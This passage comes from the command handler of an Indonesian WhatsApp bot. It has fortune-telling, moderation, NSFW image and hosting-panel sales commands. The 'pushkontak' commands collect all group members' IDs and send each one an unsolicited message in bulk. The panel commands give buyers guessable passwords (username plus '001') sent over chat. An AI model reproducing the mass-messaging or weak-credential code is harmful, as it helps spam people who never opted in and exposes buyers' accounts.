 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) return m.reply('*ʟᴜ ᴅɪ ʙᴀɴ ᴏʟᴇʜ lynnzxd')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) return m.reply('ʟᴜ ᴅɪ ʙᴀɴ ᴏʟᴇʜ lynnzxd')
await loading()
 if (!text) throw `Example : ${prefix + command} SlimexTzy, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
case 'pushkontak2':{
if (!isCreator) return reply(mess.owner)
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return reply(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await slime.groupMetadata(idgc).catch((e) => reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
reply(`*_Sedang Push ID..._*\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_*`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
slime.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
reply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 3000);
}
}
break;
case 'pushkontak':{
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(`di group coy`)
if (!text) return reply(`Teks Nya Dek?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
slime.sendMessage(geek, {text: `${teksnye}`}, {quoted:fcall})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case "cekidgc": {
if (!isCreator) return reply(mess.premium)
let getGroups = await slime.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await slime.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case 'getidgc':
if (!m.isGroup) return reply('kusus Group')
ewe = `${m.chat}`
await slime.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'join': {
if (!isCreator) return reply(mess.owner)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await slime.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
        break
        case 'removebg2': case 'nobg2':{
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/removebg?url=${url}`)
let data = await anu.json()
await slime.sendMessage(m.chat, {image: {url: data.url.result}, caption: mess.done}, {quoted:m})
}
break
case 'capcut':{
if (!text) return reply(`Enter the link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await slime.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
slime.sendMessage(m.chat, { video: { url: anu.result.video_ori}, caption: mess.done}, {quoted: m})
await slime.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await slime.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
        case 'group': {   
if (!isCreator) return m.reply('ᴋʜᴜsᴜs lynnzxd')
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ')
if (!isAdmins) return m.reply('ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ')
await loading()
if (args[0] === 'tutup group'){
await slime.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'buka group'){
await slime.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
slime.sendMessage(m.chat, { image: ppnyauser, caption: `ᴄᴏɴᴛᴏʜ ; .alya ᴛᴜᴛᴜᴘ ɢʀᴏᴜᴘ
ᴄᴏɴᴛᴏʜ : .alya ʙᴜᴋᴀ ɢʀᴏᴜᴘ`}, {quoted:m}) 
 }
}
break
case 'antitoxic2': {
if (!isCreator) return m.reply('ᴋʜᴜsᴜs lynnzxd')
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴏ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ')
if (!isAdmins) return m.reply('ʟᴜ ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ ɢʀᴏᴜᴘ')
if (args[0] === "on") {
if (db.data.chats[m.chat].antitoxic2) return reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antitoxic2 = true
reply(`antitoxic Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antitoxic2) return reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antitoxic2 = false
reply(`antitoxic Tidak Aktif !`)
} else {
reply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
}
}
break
case "antitoxic":
{
if (!isCreator) return m.reply('ᴋʜᴜsᴜs lynnzxd')
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴏ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ')
if (!isAdmins) return m.reply('ʟᴜ ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ ɢʀᴏᴜᴘ')
await loading()
if (args.length < 1) return m.reply('ᴏɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴏғғ ᴜɴᴛᴜᴋ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')
if (args[0] === "on") {
if (welcmm) return m.reply('ᴛᴇʟᴀʜ ᴀᴋᴛɪғ')
wlcmm.push(from)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `ᴀɴᴛɪᴛᴏxɪᴄ sᴜᴄᴄᴇs ᴛʟᴀʜ ᴀᴋᴛɪғ`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('sᴜᴅᴀʜ ɴᴏɴ ᴀᴋᴛɪғ')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break
	case 'fuck': case 'ajg': case 'ngentod': case 'bangsat': case'anjing': case'babi': case'kontol': case'memek': case'penis': case 'ngewe': case 'yatim': case 'piatu': case 'pentil': case 'pepek': case 'kudacuki': case 'pepekk': case 'bajingan': case 'ndasmu': case 'anjink': case 'kntol': case 'puqi': case 'pukimak': case 'bego': case 'bangsat': case 'bngst': case 'bangst': case 'bngsat': case 'anjg': case 'taik': case 'ngentot': case 'tolol': case 'goblok': case 'gblok': case 'bangke':{
if (!welcmm) return
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
if (!m.isGroup) return m.reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
if (isAdmins) return slime.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin sudah Toxic, admin bebas Toxic apapun`})
if (isCreator) return slime.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nOwner telah Toxic, owner bebas Toxic apa pun`})
await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
slime.sendMessage(from, {text:`\`\`\`「 Kata Kata Toxic Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan toxic di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:slime})
}
break
//=================================================//
case 'google': {
 if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
case 'couple': {
await loading()
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
slime.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
slime.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted:m})
}
break
//=================================================//
case 'coffe': case 'kopi': {
await loading()
slime.sendMessage(from, {image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`},{quoted:m})
}
break
//=================================================//
case 'getname': {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
if (qtod === "true") {
namenye = await slime.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
slime.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (!isCreator) return m.reply('*ᴋʜᴜsᴜs lynnzxd*')
await loading()
if (qtod === "true") {
try {
pporg = await slime.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
slime.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted:m})
} else if (qtod === "false") {
try {
pporgs = await slime.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
slime.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:m})
}
}
break


//=================================================//
case "setppbot": {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await slime.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await slime.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await slime.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
        break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isCreator) return m.reply('ᴋʜᴜsᴜs lynnzxd')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await slime.downloadAndSaveMediaMessage(m)
await slime.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('done')
}
break
//=================================================//
case 'block': {
if (!isCreator) return m.reply('ᴋʜᴜsᴜs lynnzxd')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await slime.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply('ᴋʜᴜsᴜs lynnzxd')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await slime.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'toanime2': case 'jadianime2': {
if (!isPrem) return reply('khusus prem')
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
try {
reply(mess.wait)
const media = await slime.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh (media)
slime.sendMessage(m.chat, { image: { url: `https://widipe.com/toanime?url=${anu}` }, caption: 'Selesai'}, { quoted: m})
	} catch {
	  reply('yah eror dek laporkan ke owner agar di perbaiki')
	}
}
break
case 'neko' :
if (!isPrem) return reply(`Khusus Prem`)
await loading()
waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
slime.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ah Sayang 🥺🥺`},{ quoted:m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'waifu' :
if (!isPrem) return reply(`Khusus Prem`)
await loading()
waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
slime.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ahh Sayang 🥺🙏`}, { quoted:m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
await loading()
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
slime.sendImage(from, data.url, 'Success Coy', m)
})
break
// BATAS CPANEL V2 DAN V1\\
case '1gb': {
        if (!isPrem) return reply(`ᴋʜᴜꜱᴜꜱ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ wa.me/6283167532721`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "40"
let disk = "1024"
let email = username + "@lynnzxd.com"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
let ctf = `*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Storage :* ${disk}
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://lynnzxd.carrd.co/#","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"name": name,
"description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Jangan Lupa Join Sini Bro*\n
◦ All Info : https://lynnzxd.carrd.co/#
     
◦ Saluran : https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
     
◦ Group¹ : https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
     
◦ Group² : https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9`)
}
break
case "2gb": {
    if (!isPrem) return reply(`ᴋʜᴜꜱᴜꜱ ʀᴇꜱᴇʟʟᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ wa.me/6283167532721`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "60"
let disk = "2048"
let email = username + "@lynnzxd.com"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
let ctf = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Storage :* ${disk}
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://lynnzxd.carrd.co/#","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"name": name,
"description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Jangan Lupa Join Sini Bro*\n
◦ All Info : https://lynnzxd.carrd.co/#
     
◦ Saluran : https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
     
◦ Group¹ : https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
     
◦ Group² : https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9`)
}
break
case "3gb": {
    if (!isPrem) return reply(`ᴋʜᴜꜱᴜꜱ ʀᴇꜱᴇʟʟᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ wa.me/6283167532721`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "80"
let disk = "3072"
let email = username + "@lynnzxd.com"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
let ctf = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Storage :* ${disk}
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://lynnzxd.carrd.co/#","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"name": name,
"description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Jangan Lupa Join Sini Bro*\n
◦ All Info : https://lynnzxd.carrd.co/#
     
◦ Saluran : https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
     
◦ Group¹ : https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
     
